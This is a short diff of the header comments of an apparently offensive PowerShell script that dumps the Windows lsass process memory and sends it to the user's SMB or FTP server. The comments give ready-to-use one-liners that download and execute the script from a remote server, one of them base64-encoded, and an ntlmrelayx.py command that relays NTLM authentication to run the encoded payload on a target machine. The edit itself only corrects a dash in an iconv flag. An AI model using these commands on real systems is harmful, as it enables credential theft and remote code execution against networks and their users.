@@ -2,7 +2,7 @@
 # It does dump the lsass process memory and sends it to your smb/ftp.  Resulting file name like computername.domain.dmp
 # Use it: powershell -nop -c "iex(NEW-Object Net.WebClient).DownloadString('ftp://server/share/remotepd.ps1')"
 #
-#  Base64 for Windows in linux: echo your_string | iconv —to-code UTF-16LE | base64 -w 0
+#  Base64 for Windows in linux: echo your_string | iconv --to-code UTF-16LE | base64 -w 0
 #  powershell   -nop -c  -Enc "iex(NEW-Object Net.WebClient).DownloadString('http://yourserver/remotepd.ps1')"'
 #  ntlmrelayx.py --no-http-server -smb2support -t msedgewin10 -c 'powershell  -Enc aQBlAHgAKABOAEUAVwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAHkAbwB1AHIAcwBlAHIAdgBlAHIALwByAGUAbQBvAHQAZQBwAGQALgBwAHMAMQAnACkACgA='
 #  You must set:
